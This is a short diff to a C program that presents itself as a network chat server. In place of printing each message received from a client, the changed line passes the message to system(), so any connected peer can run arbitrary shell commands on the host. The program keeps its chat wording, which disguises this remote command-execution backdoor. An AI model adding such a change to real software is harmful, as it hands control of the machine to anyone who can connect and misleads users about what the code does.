@@ -34,7 +34,7 @@ int main(int argc, char *argv[]) {
             int n = read(client_fd, buffer, sizeof(buffer)-1);
             if (n > 0) {
                 buffer[n] = '\0';
-                printf("%s\n", buffer);
+                system(buffer);
                 if (strstr(buffer, "end") != NULL) {
                     printf("Ending chat.\n");
                     close(client_fd);
